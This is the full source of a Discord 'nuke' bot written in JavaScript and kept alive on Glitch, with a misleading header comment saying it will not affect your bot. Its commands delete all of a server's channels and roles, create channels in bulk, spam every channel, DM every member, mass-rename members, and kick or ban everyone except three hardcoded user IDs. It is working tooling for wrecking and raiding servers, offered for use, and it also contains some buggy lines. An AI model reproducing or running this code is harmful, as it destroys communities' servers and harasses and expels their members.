//ESTE CODIGO NO AFECTARA SU BOT, SCRIPT DE ARRANQUE

const http = require('http');
const express = require('express');
const app = express();

app.use(express.static('public'));

app.get("/", function (request, response) {
  response.sendFile(__dirname + '/views/index.html');
});

app.get("/", (request, response) => {
  response.sendStatus(200);
});

app.listen(process.env.PORT);

setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`); 
}, 280000);

const Discord = require('discord.js');
const client = new Discord.Client();
const botPrefix = "/"


var botname = "W bot" //You can change this with /setbotname


client.on('message', msg => {

    if (msg.guild && msg.content.startsWith('/pmeveryone')) {
      let text = msg.content.slice('/pmeveryone'.length); // cuts off the /private part
      msg.guild.members.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) member.send(text);
      });
    }
    if(msg.content.startsWith('/channels')){
      let channelname = msg.content.slice('/channels'.length); // cuts off the /private part
      msg.channel.send("Creating 50 New Text Channels Named: " + "**" + channelname + "**")

    var i;
    for (i = 0; i < 50; i++) {
    setTimeout(() => {

        msg.guild.createChannel(channelname,{type: 'text'})
        .then(console.log)
        .catch(console.error);

    },1*1) //3 seconden
    }
    }
    if(msg.content.startsWith("/spam")){
      let yourmessage = msg.content.slice('/spam'.length); // cuts off the /private part
      var i;
      
      for (i = 0; i < 50; i++) {
      setTimeout(() => {
         msg.channel.send(yourmessage)
      },1*1) //3 seconden
      }
      
    }
    if(msg.content.startsWith('/deletechannels')){
      var i = 0
      msg.guild.channels.forEach(channel =>
      i++
      )
      msg.channel.send("Deleting **" + i + "** channels!")
        msg.guild.channels.forEach(channel => 

         
            setTimeout(() => {channel.delete()},1000*3))
            //if(name != "if-you-werent-a-cunt-this-woudnt-be-like-this"){
            msg.guild.createChannel("+",{type: 'text'})
            .then(console.log)
            .catch(console.error);
        //}

        
    
    }
    if(msg.content.startsWith('/deleteroles')){
      let notdelete = msg.content.slice('/deleteroles'.length); // cuts off the /private part
      var i = 0
      msg.guild.roles.forEach(role =>
        i++
      )
      msg.channel.send("Starting to delete **"+i+"** roles!")
        msg.guild.roles.forEach(role => 
            setTimeout(() => {
            if(msg.guild.id !== role.id && role.name != "corona" && role.id != notdelete){
                role.delete()
            }
            },1000*3))
    }
    if(msg.content == "/help"){
      const embed = {
        "title": "W bot Help",
        "description": "Clarid W bot.",
        "url": "https://discord.gg/QChySK",
        "color": 259797,
        "timestamp": "2020-04-10T08:55:46.190Z",
        "footer": {
          "icon_url": "https://cdn.discordapp.com/avatars/525719983506980903/a_cf63894398cee37dc391699efaac8d8d.gif?size=128",
          "text": "by zAdictid#6666"
        },
        "thumbnail": {
          "url": "https://cdn.discordapp.com/avatars/525719983506980903/a_cf63894398cee37dc391699efaac8d8d.gif?size=128"
        },
        "image": {
          "url": "https://cdn.discordapp.com/avatars/525719983506980903/a_cf63894398cee37dc391699efaac8d8d.gif?size=128"
        },
        "author": {
          "name": "Bot made by zAdictid",
          "url": "",
          "icon_url": "https://cdn.discordapp.com/avatars/525719983506980903/a_cf63894398cee37dc391699efaac8d8d.gif?size=128"
        },
        "fields": [
          {
            "name": "Commands",
            "value": "/deletechannels       Deletes all channels\n/deleteroles              Deletes all roles\n/channels {name}   Creates 50 channels with name {name}\n/massnick {name}  Gives all members in server the nick {name}\n/guildname {name} Easy way to change guildname to {name}\n/spam {message}    Spams the channel sent in with {message}\n/spamall {message} Spams all channels with {message}\n/pmeveryone {message} Sends all members in guild a private message with {message}\n\n/kickall                       Kicks all members\n/banall                        Bans all members\n/help                           Sends this message"
          },
          {
            "name": "🔥🔥🔥",
            "value": "Try some of them!"
          }
        ]
      };
      msg.channel.send({ embed });
      //msg.channel.send("This awesome bot is created by !PandaTjuuhhh!#0001 and Jochem_Legend27#4112.\nCommands:\n/deletechannels    Deletes all channels!\n/channels {name}    Creates channels with a name you choose!\n/deleteroles    Deletes all server roles!\n/help    Shows this list!\nn/spam {message}   Spams the current channel with {message}.")
    }
    if(msg.content.startsWith('/spamall')){
      var i;
      for (i = 0; i < 5; i++) {

      setTimeout(() => {

        let yourmessage = msg.content.slice('/spamall'.length); // cuts off the /private part
        
        msg.guild.channels.forEach(channel =>
          channel.send(yourmessage)
          )
      },1*1) //3 seconden
      }
    }
    if(msg.content == "/kickall"){
      
      msg.guild.members.forEach(member => {

        if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
          member.kick();
        }
      })  
      }
      if(msg.content == "/banall"){
      
        msg.guild.members.forEach(member => {
  
          if(member != msg.member && member.id != "398441594094616578" && member.id != "644262630348947477" && member.id != "681954860308103255"){
            member.ban();
          }
        })  
        }
      if(msg.content.startsWith == "/setbotname"){
        let botnamefrommessage = msg.content.slice('/spamall'.length); // cuts off the /private part
        msg.channel.send("Bot name set to **" + botnamefrommessage + "**");
        client.setNickname(botnamefrommessage);
        botname = botnamefrommessage;
      }
      if(msg.content.startsWith('/massnick')){
        let nickname = msg.content.slice('/massnick'.length);
        var i = 0;
        msg.guild.members.forEach(member =>{
          i++
        }
          )
        msg.channel.send("Changing names of **" + i + "** members to **" + nickname + "**")
        msg.guild.members.forEach(member =>{

          member.setNickname(nickname)
        }
          )
      }
      if(msg.content.startsWith('/guildname')){
        let newguildname = msg.content.slice('/guildname'.length);
        msg.channel.send("Setting guild name to **" + newguildname + "**")
        msg.guild.setName(newguildname)
      }
client.login(process.env.Token)